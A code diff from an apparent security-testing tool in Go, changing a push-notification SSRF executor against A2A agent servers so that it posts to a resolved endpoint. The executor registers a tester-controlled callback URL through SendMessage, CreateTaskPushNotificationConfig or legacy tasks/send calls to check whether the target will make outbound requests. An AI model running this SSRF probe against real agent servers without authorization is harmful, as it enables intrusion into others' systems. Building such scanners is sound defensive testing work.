@@ -62,6 +62,7 @@ func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts atta
 	}
 
 	client := attack.NewHTTPClient(opts, vars)
+	endpoint, _ := resolveA2AEndpoint(ctx, attack.NewUnauthHTTPClient(opts, vars), vars.BaseURL)
 	callbackURL := listenerURL + "/batesian-" + vars.RandID
 	token := "batesian-" + vars.RandID
 
@@ -74,7 +75,7 @@ func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts atta
 	a2aHeaders := map[string]string{"A2A-Version": "1.0"}
 
 	// Attempt 1: A2A-sdk v1.0 two-step: SendMessage then CreateTaskPushNotificationConfig
-	sendResp, err := client.POST(ctx, vars.BaseURL+"/", a2aHeaders, map[string]interface{}{
+	sendResp, err := client.POST(ctx, endpoint, a2aHeaders, map[string]interface{}{
 		"jsonrpc": "2.0",
 		"id":      "batesian-sm-" + vars.RandID,
 		"method":  "SendMessage",
@@ -90,7 +91,7 @@ func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts atta
 		// Got a task - try to register push notification config for it
 		taskID, _ := extractTaskContext(sendResp.Body)
 		if taskID != "" {
-			pushResp, pushErr := client.POST(ctx, vars.BaseURL+"/", a2aHeaders, map[string]interface{}{
+			pushResp, pushErr := client.POST(ctx, endpoint, a2aHeaders, map[string]interface{}{
 				"jsonrpc": "2.0",
 				"id":      "batesian-push-" + vars.RandID,
 				"method":  "CreateTaskPushNotificationConfig",
@@ -109,7 +110,7 @@ func (e *PushSSRFExecutor) Execute(ctx context.Context, target string, opts atta
 
 	// Attempt 2: Legacy JSONRPC v0.3 tasks/send with embedded pushNotification config
 	if !taskAccepted {
-		jsonrpcResp, err2 := client.POST(ctx, vars.BaseURL+"/", map[string]string{}, buildJSONRPCRequest(callbackURL, token, vars.RandID))
+		jsonrpcResp, err2 := client.POST(ctx, endpoint, map[string]string{}, buildJSONRPCRequest(callbackURL, token, vars.RandID))
 		if err2 == nil && jsonrpcResp.IsSuccess() && !isJSONRPCError(jsonrpcResp.Body) &&
 			jsonrpcResp.ContainsAny(`"result"`) {
 			taskAccepted = true
